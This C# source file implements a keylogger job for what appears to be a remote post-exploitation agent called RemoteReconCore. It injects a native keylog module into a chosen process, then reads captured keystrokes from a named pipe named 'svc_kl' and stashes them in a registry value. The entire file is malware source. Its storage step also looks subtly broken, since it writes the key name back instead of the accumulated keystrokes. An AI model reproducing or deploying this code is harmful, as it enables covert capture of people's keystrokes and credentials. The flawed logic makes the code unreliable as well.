using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ReflectiveInjector;

namespace RemoteReconCore
{
    public class Keylogger : IJobs
    {
        private int targetPid;

        public Keylogger(int pid)
        {
            targetPid = pid;
        }

        public KeyValuePair<int, string> Run()
        {
            byte[] keylogMod = Agent.PatchRemoteReconNative("keylog");
            Injector keylog = new Injector(targetPid, keylogMod);
            if (!keylog.Inject())
                return new KeyValuePair<int, string>(2, "Failed to inject keylogger");
            else
            {
#if DEBUG 
                Console.WriteLine("Injected Keylogger");
#endif
                Action runner = new Action(WriteKeyStrokes);
                Task t = new Task(runner);

                t.Start();
#if DEBUG
                Console.WriteLine("Started background thread to sync keylogger");
#endif
                return new KeyValuePair<int, string>(0, "Keylogger successfully started");
            }
            
        }

        private static void WriteKeyStrokes()
        {
            Thread.Sleep(Agent.sleep * 1000);

            NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_kl", PipeDirection.InOut);
            client.Connect(Agent.sleep * 1000);
#if DEBUG
            Console.WriteLine("Connected to namedpipe server");
            Console.WriteLine("Starting loop");
#endif
            while(client.IsConnected)
            {
                StreamReader sr = new StreamReader(client);

                string oldVal = Encoding.Unicode.GetString(Convert.FromBase64String((string)Agent.rrbase.GetValue(Agent.kkey)));
                string retVal = sr.ReadToEnd();
                string newStrokes = Encoding.Unicode.GetString(Convert.FromBase64String(retVal));
                oldVal = oldVal + newStrokes;
                Agent.rrbase.SetValue(Agent.kkey, (string)Agent.kkey);
            }

#if DEBUG
            Console.WriteLine("Client disconnected");
#endif
            client.Close();
            client.Dispose();
            
        }
    }
}
